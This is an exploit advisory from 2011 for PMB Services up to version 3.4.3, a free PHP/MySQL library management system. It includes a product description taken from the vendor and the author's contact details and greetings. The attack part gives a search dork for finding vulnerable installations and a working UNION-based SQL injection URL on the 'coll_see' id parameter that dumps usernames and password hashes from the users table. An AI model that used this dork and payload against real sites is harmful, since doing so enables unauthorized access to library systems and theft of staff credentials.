@@ -1,0 +1,68 @@
+888                       888                    888                  
+888                       888                    888                  
+888                       888                    888                  
+888     888  888  .d8888b 88888b.   8888b.   .d88888  .d88b.  888d888 
+888     888  888 d88P"    888 "88b     "88b d88" 888 d88""88b 888P"   
+888     888  888 888      888  888 .d888888 888  888 888  888 888     
+888     Y88b 888 Y88b.    888  888 888  888 Y88b 888 Y88..88P 888     
+88888888 "Y88888  "Y8888P 888  888 "Y888888  "Y88888  "Y88P"  888     
+                                                                      
+                                                                      
+----------------------------------------------------------------------------	
+# Exploit Title: [ PMB Services <= 3.4.3 Remote SQL Injection ]																  
+#Author         : Luchador
+#Date           : 29-01-2011
+#Location       : Algeria
+#Site           : http://vbspiders.com
+#Critical Lvl   : Dangerous
+#Mail: nourie.tlm[at]gmail.com
+----------------------------------------------------------------------------
+#Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Application   : PMB Services
+version       : <= 3.4.3
+Vendor        : http://www.pmbservices.fr
+Download      : http://www.pmbservices.fr/download/index.php
+
+Description :
+ 
+PMB is a completely free ILS (Integrated Library management System). 
+The domain of software for libraries is almost exclusively occupied by proprietary products.
+We are some librarians, users and developers deploring this state of affairs.
+ 
+PMB is based on web technology. This is what we sometimes call a 'web-app'.
+PMB requires an HTTP server (such as Apache, but this is not an obligation), the MySQL database and the PHP language.
+ 
+The main functions of PMB are :
+ 
+    * Supporting the UNIMARC format
+    * Authorities management (authors, publishers, series, subjects...)
+    * Management of loans, holds, borrowers...
+    * A user-friendly configuration
+    * The ability to import full bibliographic records
+    * A user-friendly OPAC integrating a browser
+    * Loans management with a module designed to serve even the very small establishments
+    * Serials management
+    * Simple administration procedures that can be handled easily even by the library staff...
+----------------------------------------------------------------------------	
+#Vulnerability:
+~~~~~~~~~~~~~
+- Remote SQL Injection 
+#dork      : inurl:opac_css or inurl:index.php?lvl=coll_see&id=
+#Exploit:
+~~~~~~~~~
+http://www.target.com[path pmb]/index.php?lvl=coll_see&id=-1/**/union/**/select+1,2,3,unhex(hex(group_CONCAT(username,0x3a,pwd))),5,6,7+from+users--
+
+
+# Greetz    : VoLc4n0,Q2-FOX2R 
+----------------------------------------------------------------------------																	  
+#Author         : Luchador
+#Date           : 29-01-2011
+#Location       : Algeria
+#Site           : http://vbspiders.com
+#Critical Lvl   : Dangerous
+#Mail: nourie.tlm[at]gmail.com
+--------------------- Hack To Learn, Learn To Hack----------------------------
+
+ 
+
